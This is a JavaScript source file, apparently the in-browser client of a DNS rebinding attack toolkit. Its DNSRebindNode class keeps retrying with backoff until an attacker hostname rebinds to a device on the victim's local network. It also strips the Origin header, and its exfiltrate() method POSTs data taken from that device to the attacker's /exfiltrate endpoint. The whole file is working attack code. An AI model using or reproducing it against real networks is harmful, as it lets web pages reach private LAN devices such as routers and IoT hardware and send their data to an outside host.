class DNSRebindNode {

    static fetchOptions() {
        return {
            method: "GET",
            headers: {
                // this doesn't work in all browsers
                "Origin": "", //unset the origin header
                "Pragma": "no-cache",
                "Cache-Control": "no-cache"
            },
            cache: "no-cache"
        }
    }

    static async rebind(url, options) {

        options = options || {}
        options.backoff = options.backoff || 1000 // 1, 2, 4, 8, 16, 32, 64 seconds
        options.fetchOptions = options.fetchOptions || DNSRebindNode.fetchOptions()
        const result = await fetch(url, options.fetchOptions)

        // The rebind successPredicate(...) is true or we got a 200 OK,
        // the rebind was successful
        if ((options.successPredicate && options.successPredicate(result)) ||
            (!options.successPredicate && result.status == 200)) {
            DNSRebindNode.emit('rebind', true)
            return result
        // we are still communicating with the DNS Rebind Toolkit server,
        // keep trying...
        } else if (result.headers.get('Server') == 'DNS Rebind Toolkit Server') {
            if (options.backoff <= 64000) {
                options.backoff *= 2
                await DNSRebindNode.timeout(options.backoff)
                return await DNSRebindNode.rebind(url, options, options.backoff)
            }
        }
        // the rebind failed
        return Promise.reject(Error('Error during rebind. Host may be down.'))
    }

    static async exfiltrate(name, data, type) {

        // e.g. get '52.11.130.20' from
        // 'A.52.11.130.20.1time.192.168.1.1.forever.rebind.network'
        let host = location.host.split('.1time')[0].replace(/[Aa]\./, '')

        // if this host has a port, add that
        if (location.host.split(':').length > 1) {
            host = `${host}:${location.host.split(':')[1]}`
        }

        // make exfiltrate POST requests to /exfiltrate
        const url = `http://${host}/exfiltrate`
        
        type = (type || 'json').toLowerCase()

        if (!['json', 'xml', 'txt'].includes(type)) {
            throw Error(`type parameter must be "json", "xml", or "txt" not ${type}`)
        } 

        const options = DNSRebindNode.fetchOptions()
        options.headers['Content-Type'] = 'application/json'
        options.method = 'POST'
        options.body = JSON.stringify({
            name,
            data,
            type
        })

        try {
            const response = await fetch(url, options)
            if (response.ok) {
                DNSRebindNode.emit('exfiltrate', data)
                return Promise.resolve()
            } else {
                console.error(response)
                return Promise.reject(Error('Exfiltrate failed'))
            }
        } catch (err) {
            return Promise.reject(err)
        }
    }

    static destroy() {
        DNSRebindNode.emit('destroy')
    }

    static emit(name, data) {

        let ip = null

        // parse the LAN IP from the host
        try { ip = location.host.split('1time.')[1].split('.forever')[0] }
        catch (err){}

        window.parent.postMessage({name, ip, data}, '*')
    }

    static timeout(millis) {
        return new Promise(resolve => setTimeout(resolve, millis))
    }
}

// emit a begin message on script load
DNSRebindNode.emit('begin')
